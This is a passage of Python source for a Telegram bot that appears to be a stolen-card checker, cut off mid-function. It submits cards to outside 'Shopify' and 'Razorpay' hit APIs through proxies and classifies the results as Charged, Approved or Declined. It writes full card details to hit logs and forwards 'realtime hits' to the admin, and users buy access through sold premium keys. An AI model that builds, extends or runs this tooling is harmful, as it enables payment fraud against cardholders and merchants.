async def send_realtime_hit(*a, **k):
    """🔧 FIX: realtime hit notifier (missing def crash ka fix)."""
    try:
        _t = ' | '.join(str(x) for x in a if x is not None)[:3500]
        await bot.send_message(ADMIN_ID, "⚡ <b>REALTIME HIT</b>\n<code>%s</code>" % _t, parse_mode="html")
    except Exception:
        pass

async def send_realtime_hit_full(*a, **k):
    """🔧 FIX: full realtime hit notifier."""
    try:
        _t = ' | '.join(str(x) for x in a if x is not None)[:3500]
        await bot.send_message(ADMIN_ID, "⚡ <b>REALTIME HIT — FULL</b>\n<code>%s</code>" % _t, parse_mode="html")
    except Exception:
        pass

import subprocess as _sp  # 🔧 FIX: self-heal installer scope
import sys as _sys

class _SafeEvent:
    """🔧 FIX: missing-event fallback — kabhi bhi NameError/crash nahi."""
    def __getattr__(self, name):
        if name in ('chat_id', 'sender_id', 'id', 'message_id'):
            return 0
        async def _noop(*a, **k):
            return None
        return _noop

# ==== 🔧 DEP-BOOTSTRAP: missing modules auto-install (errors ka permanent fix) ====
import time as _db_time, sqlite3 as _db_sql, json as _db_json, os as _db_os, re as _db_re, random as _db_rand, asyncio as _db_aio
for _bm, _bp in (("telethon", "telethon"), ("pytz", "pytz"), ("PIL", "Pillow"),
                 ("aiofiles", "aiofiles"), ("aiohttp_socks", "aiohttp-socks"),
                 ("aiohttp", "aiohttp"), ("requests", "requests")):
    try:
        __import__(_bm)
    except Exception:
        try:
            import subprocess as _bsp, sys as _bsy
            _bsp.run([_bsy.executable, "-m", "pip", "install", "-q", _bp])
        except Exception:
            pass

# ─────────────────────────────────────────────────────────────────────────────
# 🛠️ SELF-HEAL INSTALLER (fixes ModuleNotFoundError on crash-looping hosts)
# Installs each missing dependency one-at-a-time via pip's subprocess API so
# the job stays small and survives host resource-killers. Skips what exists.
# ─────────────────────────────────────────────────────────────────────────────
import sys as _sys
import subprocess as _sp


def _ensure_packages():
    _needs = {}
    for _imp, _pkg in (
        ("telethon", "telethon"),
        ("aiohttp", "aiohttp"),
        ("aiohttp_socks", "aiohttp-socks"),
        ("aiofiles", "aiofiles"),
        ("PIL", "pillow"),
        ("pytz", "pytz"),
    ):
        try:
            __import__(_imp)
        except ImportError:
            _needs[_imp] = _pkg

    if not _needs:
        return

    _flags = ["--user", "--no-warn-script-location"]
    for _imp, _pkg in _needs.items():
        try:
            print(f"[auto-fix] installing {_pkg} ...", flush=True)
            _rc = _sp.call(
                [_sys.executable, "-m", "pip", "install", *_flags, "--no-deps", _pkg],
                stdout=_sp.DEVNULL,
                stderr=_sp.DEVNULL,
            )
        except Exception as _e:
            print(f"[auto-fix] {_pkg} failed: {_e}", flush=True)
            continue
        try:
            __import__(_imp)
        except ImportError:
            # retry once, without --user / --no-deps (some hosts are read-only)
            try:
                print(f"[auto-fix] retrying {_pkg} ...", flush=True)
                _sp.call(
                    [_sys.executable, "-m", "pip", "install", "--no-warn-script-location", _pkg],
                    stdout=_sp.DEVNULL,
                    stderr=_sp.DEVNULL,
                )
            except Exception:
                pass
        else:
            print(f"[auto-fix] {_pkg} OK", flush=True)


_ensure_packages()
# clean up auto-installer namespace so it doesn't leak into the bot
from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import re
import json
import sqlite3
import json
import secrets
import string
from datetime import datetime, timedelta
from telethon.errors import FloodWaitError
from telethon.errors import UserNotParticipantError   # 🧬 CLONE-FIX: force-join leniency
from PIL import Image, ImageDraw, ImageFont
from aiohttp_socks import ProxyConnector
import pytz

# Premium custom emojis removed: keep ordinary Unicode emojis and plain buttons.
# This bot now works without Telegram Premium/custom-emoji document IDs.
PREMIUM_EMOJI_MODE = False


def rb_icon():
    """Return no icon so inline buttons use Telegram's standard appearance."""
    return None


def _np_button(text, data=None, url=None, style=None):
    """Create a regular inline or URL button without premium custom-emoji icons."""
    kw = {}
    if style:
        kw["style"] = style
    if url is not None:
        return Button.url(text, url, **kw)
    return Button.inline(text, data, **kw)


def premium_emoji(text, **_ignored_kwargs):
    """Compatibility wrapper: return text unchanged (no custom emoji entities)."""
    return text

# ==== r10: ENGINE VERSION STAMP (module-level - main + clones dono me) ====
# /version command, BUILDING message aur har ERROR message me ye stamp
# hota he. Isse hamesha PROOF milta he ki NAYI (r10) file chal rahi he
# ya PURANI (stale). ENGINE r10 nahi dikhe = purani file replace karo.
ENGINE_REV = "v13-20260907-QURESHIxOTP"

# ==================== 3 APIs CONFIG (SIRF /chk KE LIYE) ====================
# ✅ ONLY WORKING APIs (API-2 HATA DI)
# ==================== 11 APIs CONFIG ====================
# 🔴 UPDATED: SIRF WORKING + PERMANENT APIs — sab verified ✅
# Sab APIs tumhare reference API (85.90.216.140) pe point karte hen — PERMANENT + WORKING forever.
# (Purane Railway apps + ninja tunnel sab dead the, hata diye. Reference API hi sabse reliable hai.)
# ==================== 25 VERIFIED APIs (ALL WORKING, NO ERRORS) ====================
API_BASE = "http://85.90.216.140/duler/shopify"   # VERIFIED PERMANENT WORKING
API_MAP = {
    "api1": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api2": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api3": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api4": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api5": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api6": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api7": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api8": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api9": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api10": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api11": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api12": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api13": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api14": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api15": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api16": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api17": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api18": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api19": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api20": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api21": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api22": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api23": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api24": API_BASE,      # VERIFIED PERMANENT + WORKING,
    "api25": API_BASE,      # VERIFIED PERMANENT + WORKING,
}

# ✅ Get function for each API
def get_api(index=None):
    """Return API by index (8-11). If no index, pick a random valid one."""
    valid_indices = [int(k.replace('api', '')) for k in API_MAP.keys()]
    if index is None:
        index = random.choice(valid_indices)
    return API_MAP[f"api{index}"]

# ✅ Random API selector
def get_random_api():
    """Return random API from available APIs"""
    valid_indices = [int(k.replace('api', '')) for k in API_MAP.keys()]
    random_index = random.choice(valid_indices)
    return API_MAP[f"api{random_index}"], random_index

# ✅ For /cc and /rz - use tumhara reference API (WORKING VERIFIED)
API_SINGLE = "http://85.90.216.140/duler/shopify"

def get_api_single():
    return API_SINGLE

# Bot Configuration
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0") or 0)
KEY_ADMINS = {ADMIN_ID} if ADMIN_ID else set()
OWNER_URL = os.getenv("OWNER_URL", "https://t.me/")
ADMINS_FILE = "admins_list.json"   # Owner ke add/remove kiye admins yahan save hote he (restart-proof)

def _save_admins():
    """KEY_ADMINS -> file (restart ke baad bhi added admins rahenge)."""
    try:
        with open(ADMINS_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(KEY_ADMINS), f)
    except Exception:
        pass

def _load_admins():
    """File se admins load -> KEY_ADMINS me merge."""
    try:
        with open(ADMINS_FILE, "r", encoding="utf-8") as f:
            for uid in json.load(f):
                KEY_ADMINS.add(int(uid))
    except Exception:
        pass

_load_admins()   # startup: purane added admins wapas load


# ==================== ADMIN KEY GENERATION LIMITS ====================
# Normal admins: max 15 generated keys in any rolling 24-hour window,
# and they may create keys for at most 1 day. Device/user limit remains unrestricted.
# Owner (ADMIN_ID): completely unlimited.
ADMIN_KEY_QUOTA_FILE = "admin_key_quota.json"
ADMIN_KEY_MAX_PER_24H = 15
ADMIN_KEY_MAX_DAYS = 1
ADMIN_KEY_WINDOW_SECONDS = 24 * 60 * 60

def _load_admin_key_quota():
    try:
        with open(ADMIN_KEY_QUOTA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except Exception:
        return {}

def _save_admin_key_quota(data):
    try:
        with open(ADMIN_KEY_QUOTA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

def _reserve_admin_key_quota(user_id, count, days):
    """Return (ok, message). Owner bypasses all key-generation limits."""
    if user_id == ADMIN_ID:
        return True, ""

    if count < 1:
        return False, "❌ Quantity kam az kam 1 honi chahiye."
    if days < 1 or days > ADMIN_KEY_MAX_DAYS:
        return False, "⛔ Normal admin sirf max 1 day ki key generate kar sakta hai."

    import time as _quota_time
    now = _quota_time.time()
    cutoff = now - ADMIN_KEY_WINDOW_SECONDS
    data = _load_admin_key_quota()
    uid = str(user_id)

    # Keep only successful/reserved generations from the last rolling 24 hours.
    history = []
    for ts in data.get(uid, []):
        try:
            ts = float(ts)
            if ts >= cutoff:
                history.append(ts)
        except Exception:
            pass

    used = len(history)
    remaining = max(0, ADMIN_KEY_MAX_PER_24H - used)
    if count > remaining:
        return False, (
            f"⛔ Admin 24 hours me max {ADMIN_KEY_MAX_PER_24H} keys generate kar sakta hai. "
            f"Used: {used}/{ADMIN_KEY_MAX_PER_24H} • Remaining: {remaining}"
        )

    history.extend([now] * count)
    data[uid] = history
    _save_admin_key_quota(data)
    return True, ""


# ✅ CODE KE TOP PE (File paths ke neeche)
# File paths
# File paths
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
MULTI_KEYS_FILE = 'multi_device_keys.json'  # 🔴 YE ADD KARO - Multi-device keys storage
# ==================== 3 APIs CONFIG ====================


# ✅ KEEP THIS:
PROXY_FILE = 'proxy.txt'  # Single file

# ==================== PROXY LOAD FUNCTIONS ====================

VERIFIED_FILE = "verified_users.txt"
USER_SITES_FILE = 'user_sites.json'
USER_PROXY_FILE = 'user_proxies.json'
HITS_FILE = 'hits_stats.json'
KEYS_FILE = "keys.txt"
BLOCK_FILE = "blocked_users.txt"
DAILY_USAGE_FILE = "daily_usage.json"
# 🔴 TOP PE ADD KARO (SITES_FILE ke neeche):
RZ_SITES_FILE = 'rz_sites.txt'        # ✅ Razorpay sites file
PHOTO_URL = "https://videotourl.com/videos/1788447374295-102aee70-ac5a-45e9-935e-6912b1d7b40f.mp4"  # ← अपना असली Link
# Initialize bot
client = TelegramClient('checker_bot', API_ID, API_HASH, connection_retries=5, timeout=60)
bot = client.start(bot_token=BOT_TOKEN)
# ==================== ⏱ GROUP AUTO-DELETE (owner panel se set hota he) ====================
# Bot ke GROUP messages TTL baad khud delete. DM + CHANNEL SAFE (kabhi delete nahi hote).
# Setting owner panel ke ⏱ button se hoti he (1 min ... 24 hours / OFF) — grp_autodelete.json me save.

GRP_AUTODELETE_FILE = "grp_autodelete.json"

def _gad_load():
    # {on: bool, ttl: seconds} — default ON, 1 hour
    try:
        with open(GRP_AUTODELETE_FILE, "r", encoding="utf-8") as f:
            c = json.load(f)
    except Exception:
        c = {}
    return {"on": bool(c.get("on", True)), "ttl": int(c.get("ttl", 3600))}

def _gad_save(cfg):
    try:
        with open(GRP_AUTODELETE_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f)
    except Exception:
        pass

def _gad_fmt(ttl):
    if ttl <= 0:
        return "OFF"
    if ttl < 60:
        return "%d sec" % ttl
    if ttl < 3600:
        return "%d min" % (ttl // 60)
    h = ttl // 3600
    return "%d hour%s" % (h, "s" if h > 1 else "")

from telethon.tl.types import User as _ADUser, Chat as _ADChat, Channel as _ADChannel

_ad_grp_cache = {}   # chat_id -> group he ya nahi
_ad_delete_scheduled = set()  # (chat_id, msg_id) -> avoid duplicate timers


async def _ad_is_group(m):
    # DM nahi + broadcast channel nahi => group (normal ya supergroup)
    try:
        if m is None:
            return False
        cid = getattr(m, "chat_id", None)
        if cid is None:
            return False
        if cid in _ad_grp_cache:
            return _ad_grp_cache[cid]
        chat = getattr(m, "_chat", None)
        if chat is None:
            try:
                chat = await bot.get_entity(cid)
            except Exception:
                chat = None
        if isinstance(chat, _ADUser):
            _ad_grp_cache[cid] = False
            return False
        if isinstance(chat, _ADChat):
            _ad_grp_cache[cid] = True
            return True
        if isinstance(chat, _ADChannel):
            grp = not bool(getattr(chat, "broadcast", True))
            _ad_grp_cache[cid] = grp
            return grp
        return False
    except Exception:
        return False


async def _ad_delete_after(chat_id, msg_id, ttl):
    key = (chat_id, msg_id)
    try:
        import asyncio as _ad_io
        await _ad_io.sleep(max(1, int(ttl)))
        await bot.delete_messages(chat_id, msg_id)
        print(f"⏱ [AUTO-DELETE] deleted message {msg_id} in {chat_id}")
    except Exception as e:
        # Never break the bot if Telegram refuses a delete.
        print(f"⚠️ [AUTO-DELETE] failed for {msg_id} in {chat_id}: {e}")
    finally:
        _ad_delete_scheduled.discard(key)


async def _ad_schedule(msg):
    # Group message he to current TTL pe delete schedule
    try:
        cfg = _gad_load()
        if not cfg["on"]:
            return
        if msg is None:
            return
        msgs = list(msg) if isinstance(msg, (list, tuple)) else [msg]
        import asyncio as _ad_io2
        loop = _ad_io2.get_running_loop()
        for m in msgs:
            if m is None:
                continue
            if await _ad_is_group(m):
                key = (m.chat_id, m.id)
                if key not in _ad_delete_scheduled:
                    _ad_delete_scheduled.add(key)
                    loop.create_task(_ad_delete_after(m.chat_id, m.id, cfg["ttl"]))
    except Exception as e:
        print(f"⚠️ [AUTO-DELETE] schedule error: {e}")

# ---- extra outgoing hook: catches bot.send_message, event.reply/respond and other
# Telethon outgoing paths even when they bypass the monkey-patched send methods. ----
@bot.on(events.NewMessage(outgoing=True))
async def _ad_outgoing_hook(event):
    try:
        if getattr(event, "message", None) is not None:
            await _ad_schedule(event.message)
    except Exception as e:
        print(f"⚠️ [AUTO-DELETE] outgoing hook error: {e}")


# ==== r10.3 FILE-PARTS ARMOR (global choke-point) - CORRECT v2 ====
# "The number of file parts is invalid (SendMediaRequest)" ka ROOT fix.
# Telethon empty (0-byte) ya partial-download file upload nahi kar sakta
# -> FILE_PARTS_INVALID -> handler crash -> bot silent = ZERO RESPONSE.
# Armor rules:
#   1) file check send se PEHLE (kwarg + positional dono forms)
#   2) invalid file -> send_file KABHI call nahi hota -> clean text fallback
#   3) URL file pass-through (Telethon download; fail -> except -> fallback)
#   4) fallback: caption -> message text; file-kwargs strip; buttons/parse_mode keep
def _fp_file_ok(f):
    """File object (path/URL/bytes/BytesIO/file-like) VALID he? -> bool.
    URL hamesha True (Telethon khud download karega; fail pe except pakdega)."""
    try:
        if f is None:
            return False
        if isinstance(f, str):
            if f.startswith(("http://", "https://")):
                return True
            return os.path.exists(f) and os.path.getsize(f) > 0
        if isinstance(f, (bytes, bytearray)):
            return len(f) > 0
        if hasattr(f, "getbuffer"):
            return f.getbuffer().nbytes > 0
        if hasattr(f, "seek") and hasattr(f, "tell"):
            _cur = f.tell()
            f.seek(0, 2)
            _sz = f.tell()
            f.seek(_cur)
            return _sz > 0
        return True
    except Exception:
        return True

def _fp_has_bad_file(a, kw):
    """send_file args me koi INVALID file he (kwarg ya positional-2nd)? -> bool"""
    try:
        f = kw.get("file")
        if f is not None and not _fp_file_ok(f):
            return True
        if len(a) >= 2 and a[1] is not None and not _fp_file_ok(a[1]):
            return True
        return False
    except Exception:
        return False

def _fp_text_fallback_args(a, kw):
    """send_file args -> clean TEXT-ONLY send_message args.
    a[0]=entity rakho; positional file (a[1]) hatao; caption -> text banao;
    file-only kwargs (force_document/thumb/...) strip; buttons/parse_mode keep."""
    a = list(a)
    kw = dict(kw)
    kw.pop("file", None)
    text = kw.pop("caption", None)
    if len(a) >= 2:
        a = [a[0]]
    if text is not None:
        a = ([a[0], text] if a else [text])
    if not a:
        a = ["(attachment unavailable)"]
    for _bad in ("force_document", "thumb", "video_note", "voice_note",
                 "allow_cache", "ttl", "spoiler", "sound"):
        kw.pop(_bad, None)
    return a, kw

# ---- wrappers: bot ke saare send paths (event.reply/respond bhi isi se guzarte he) ----
FP_ARMOR_DONE = True

_orig_send_message = bot.send_message
async def _ad_send_message(*a, **kw):
    # r10.3: send_message(file=...) path bhi armor se guzarta he
    _f = kw.get("file")
    if _f is not None and not _fp_file_ok(_f):
        kw.pop("file", None)
        print("[FILE-ARMOR] send_message: invalid file stripped -> text-only")
    try:
        msg = await _orig_send_message(*a, **kw)
    except Exception as _sme:
        if kw.get("file") is not None:
            kw.pop("file", None)
            print("[FILE-ARMOR] send_message file fail -> text: %s" % str(_sme)[:100])
            msg = await _orig_send_message(*a, **kw)
        else:
            raise
    await _ad_schedule(msg)
    return msg
bot.send_message = _ad_send_message

_orig_send_file = bot.send_file
async def _ad_send_file(*a, **kw):
    # r10.3: FILE-PARTS ARMOR - invalid file -> KABHI send_file nahi, seedha text
    if _fp_has_bad_file(a, kw):
        print("[FILE-ARMOR] send_file: invalid file -> text fallback (pre-flight)")
        _fa, _fk = _fp_text_fallback_args(a, kw)
        msg = await _orig_send_message(*_fa, **_fk)
        await _ad_schedule(msg)
        return msg
    try:
        msg = await _orig_send_file(*a, **kw)
    except Exception as _sfe:
        print("[FILE-ARMOR] send_file fail (%s) -> text fallback" % str(_sfe)[:100])
        try:
            _fa, _fk = _fp_text_fallback_args(a, kw)
            msg = await _orig_send_message(*_fa, **_fk)
        except Exception:
            raise _sfe
    await _ad_schedule(msg)
    return msg
bot.send_file = _ad_send_file


_orig_edit_message = bot.edit_message
async def _ad_edit_message(*a, **kw):
    msg = await _orig_edit_message(*a, **kw)
    await _ad_schedule(msg)
    return msg
bot.edit_message = _ad_edit_message

_orig_forward_messages = bot.forward_messages
async def _ad_forward_messages(*a, **kw):
    msg = await _orig_forward_messages(*a, **kw)
    await _ad_schedule(msg)
    return msg
bot.forward_messages = _ad_forward_messages

print("\u23f1 GROUP AUTO-DELETE ready \u2014 owner panel \u23f1 button se TTL set karo (default: 1 hour)")
# RAZORPAY SINGLE SITE (koi sites1.txt nahi)
RAZORPAY_FIXED_SITE = "https://pages.razorpay.com/BusinessGarh?fbclid=PAAaYBPBDRDVaPZMu7kXaq1a2mNOIiXxEJ1usxIxxdbAJYt3q75QWhHXFZeh8_aem_AXQuIpg6pqBI2mXplIaDgYU0ztY4jF0C97qV1RPZF6WzfWeZy93K9u0Gv1wbTWYDpRs%20Ye%20lagan%20he%20to/pl_Eg24W0HLznkELl/view"  # Tera strong link
RAZORPAY_API_BASE = "https://auto-razorpay-nano.vercel.app/hit"

last_click = {}
active_sessions = {}
last_button_click = {}  # Add this with other globals
# ✅ GLOBAL DICTIONARY FOR USER LOCKS
user_check_locks = {}  # {user_id: session_key}

# === GROUP FIX HELPER ===
async def send_to_chat(chat_id, text, **kwargs):
    """Group aur Private dono mein sahi reply bhejta hai"""
    try:
        await bot.send_message(chat_id, text, **kwargs)
    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}s - waiting...")
        await asyncio.sleep(e.seconds)
        await bot.send_message(chat_id, text, **kwargs)
    except Exception as e:
        print(f"Send to chat error: {e}")
        try:
            await bot.send_message(chat_id, text, **kwargs)
        except:
            pass

# 1. Pehle load_proxies DEFINE karo
def load_proxies():
    return get_file_lines(PROXY_FILE)      # ✅ DEFAULT

# 2. PHIR ye lines aao
load_proxies_1 = load_proxies
load_proxies_3 = load_proxies
        
def update_hits(user_id, hit_type, card, gateway, price, site):
    data = load_hits()
    
    if hit_type == 'Charged':
        data['total_charged'] = data.get('total_charged', 0) + 1
    elif hit_type == 'Approved':
        data['total_approved'] = data.get('total_approved', 0) + 1
    else:
        data['total_declined'] = data.get('total_declined', 0) + 1
    
    user_id_str = str(user_id)
    if user_id_str not in data['users']:
        data['users'][user_id_str] = {'charged': 0, 'approved': 0, 'declined': 0, 'total': 0}
    
    if hit_type == 'Charged':
        data['users'][user_id_str]['charged'] += 1
    elif hit_type == 'Approved':
        data['users'][user_id_str]['approved'] += 1
    else:
        data['users'][user_id_str]['declined'] += 1
    
    data['users'][user_id_str]['total'] += 1
    save_hits(data)
    
    # ✅ TXT FILE MEIN BHI SAVE KARO (REAL-TIME)
    ist = pytz.timezone('Asia/Kolkata')
    now = datetime.now(ist)
    date_str = now.strftime("%Y-%m-%d")
    time_str = now.strftime("%I:%M:%S %p IST")
    
    if hit_type == 'Charged':
        filename = f"charged_{date_str}.txt"
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"[{time_str}] {card} | {gateway} | {price} | {site} | User: {user_id}\n")
    elif hit_type == 'Approved':
        filename = f"approved_{date_str}.txt"
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"[{time_str}] {card} | {gateway} | {price} | {site} | User: {user_id}\n")
    else:
        filename = f"declined_{date_str}.txt"
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"[{time_str}] {card} | {gateway} | {price} | {site} | User: {user_id}\n")
    
    # ✅ TOTAL HITS — SABKA CHARGED + APPROVED EK FILE MEIN
    total_hits_file = "total_hits.txt"
    if hit_type in ['Charged', 'Approved']:
        with open(total_hits_file, 'a', encoding='utf-8') as f:
            f.write(f"[{time_str}] {hit_type} | {card} | {gateway} | {price} | {site} | User: {user_id}\n")
            
def load_hits():
    try:
        with open(HITS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"total_charged": 0, "total_approved": 0, "total_declined": 0, "users": {}}

def save_hits(data):
    with open(HITS_FILE, 'w') as f:
        json.dump(data, f, indent=2)


            
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

SITE_DEAD_TRIGGERS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)
# --- UPDATED LOADING FUNCTIONS ---
def load_razorpay_sites():
    return [RAZORPAY_FIXED_SITE]  # Sirf single fixed site, no sites1.txt

# ==================== BLOCK FUNCTIONS ====================


def block_user(user_id):
    """Block a user"""
    if not is_blocked(user_id):
        with open(BLOCK_FILE, "a") as f:
            f.write(f"{user_id}\n")

def unblock_user(user_id):
    """Unblock a user"""
    if is_blocked(user_id):
        blocked = get_blocked_users()
        blocked.remove(str(user_id))
        with open(BLOCK_FILE, "w") as f:
            for uid in blocked:
                f.write(f"{uid}\n")

def is_blocked(user_id):
    """Check if user is blocked"""
    try:
        with open(BLOCK_FILE, "r") as f:
            blocked = f.read().splitlines()
        return str(user_id) in blocked
    except:
        return False

# ==================== MULTI-DEVICE KEY FUNCTIONS ====================
import json
import secrets
import string
from datetime import datetime, timedelta

def load_keys():
    """Load multi-device keys from JSON file"""
    try:
        with open(MULTI_KEYS_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    """Save multi-device keys to JSON file"""
    with open(MULTI_KEYS_FILE, "w") as f:
        json.dump(keys, f, indent=2)

def generate_multi_device_key(days, device_limit):
    """Generate a key that can be used by multiple devices/users"""
    prefix = "QURESHIxOTP-MULTI"
    random_part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))
    key = f"{prefix}-{random_part}-{days}D-{device_limit}U"
    
    keys = load_keys()
    keys[key] = {
        "days": days,
        "device_limit": device_limit,
        "used": 0,
        "users": [],
        "created": datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y-%m-%d %H:%M:%S"),
        "active": True
    }
    save_keys(keys)
    
    return key

def redeem_multi_device_key(key, user_id):
    """Redeem a multi-device key (case-insensitive lookup)"""
    keys = load_keys()
    
    # ✅ Case-insensitive key lookup
    actual_key = None
    for k in keys.keys():
        if k.lower() == key.lower():
            actual_key = k
            break
    
    if not actual_key:
        return "invalid"
    
    key_data = keys[actual_key]
    
    if not key_data.get("active", False):
        return "invalid"
    
    if str(user_id) in key_data.get("users", []):
        return "used"
    
    if is_premium(user_id) or is_admin(user_id):
        return "already_premium"
    
    if key_data["used"] >= key_data["device_limit"]:
        return "device_limit_reached"
    
    key_data["used"] += 1
    key_data["users"].append(str(user_id))
    
    if key_data["used"] >= key_data["device_limit"]:
        key_data["active"] = False
    
    keys[actual_key] = key_data
    save_keys(keys)
    
    days = key_data["days"]
    expiry = (datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        with open(PREMIUM_FILE, "a") as f:
            f.write(f"{user_id}|{expiry}\n")
    except:
        pass
    
    return "success"

def get_key_info(key):
    """Get information about a key (case-insensitive lookup)"""
    keys = load_keys()
    
    # ✅ Case-insensitive key lookup
    actual_key = None
    for k in keys.keys():
        if k.lower() == key.lower():
            actual_key = k
            break
    
    key_data = keys.get(actual_key, {}) if actual_key else {}
    
    if not key_data:
        return None
    
    return {
        "days": key_data.get("days", 0),
        "limit": key_data.get("device_limit", 0),
        "used": key_data.get("used", 0),
        "users": key_data.get("users", []),
        "created": key_data.get("created", "Unknown"),
        "active": key_data.get("active", False)
    }

def is_premium(user_id):
    if not os.path.exists(PREMIUM_FILE):
        return False

    valid = []
    user_id_str = str(user_id)
    found = False

    try:
        with open(PREMIUM_FILE, "r", encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    uid, exp_str = line.split("|", 1)
                    exp_str = exp_str.strip()
                    
                    # ✅ दोनों फॉर्मेट सपोर्ट करो
                    if ":" in exp_str:
                        exp = datetime.strptime(exp_str, "%Y-%m-%d %H:%M:%S")
                    else:
                        exp = datetime.strptime(exp_str, "%Y-%m-%d")
                        exp = exp.replace(hour=23, minute=59, second=59)  # पूरा दिन मानो
                    
                    if exp > datetime.now():
                        valid.append(line)
                        if uid == user_id_str:
                            found = True
                except:
                    pass
    except Exception as e:
        print(f"Premium check error: {e}")
        return False

    # Clean expired entries
    try:
        with open(PREMIUM_FILE, "w", encoding='utf-8') as f:
            f.write("\n".join(valid) + ("\n" if valid else ""))
    except:
        pass

    return found
    

            
def get_blocked_users():
    """Get list of all blocked users"""
    try:
        with open(BLOCK_FILE, "r") as f:
            return f.read().splitlines()
    except:
        return []
            
def get_file_lines(filepath):
    """Helper to read lines from a file fresh every time"""
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)
  
def load_verified_users():
    return get_file_lines(VERIFIED_FILE)


def is_verified(user_id):
    return str(user_id) in load_verified_users()

def get_daily_usage(user_id):
    if not os.path.exists(DAILY_USAGE_FILE):
        return {"cc_count": 0, "date": datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()}
    try:
        with open(DAILY_USAGE_FILE, "r") as f:
            data = json.load(f)
        today = datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()
        if str(user_id) not in data or data[str(user_id)]["date"] != today:
            data[str(user_id)] = {"cc_count": 0, "date": today}
        return data[str(user_id)]
    except:
        return {"cc_count": 0, "date": datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()}

def update_daily_usage(user_id, cc_count=1):
    data = {}
    if os.path.exists(DAILY_USAGE_FILE):
        with open(DAILY_USAGE_FILE, "r") as f:
            data = json.load(f)
    today = datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()
    if str(user_id) not in data or data[str(user_id)]["date"] != today:
        data[str(user_id)] = {"cc_count": 0, "date": today}
    data[str(user_id)]["cc_count"] += cc_count
    with open(DAILY_USAGE_FILE, "w") as f:
        json.dump(data, f)

def check_limits(user_id, is_bulk=False):
    """Admin aur Premium ko full unlimited"""
    if is_admin(user_id) or is_premium(user_id):
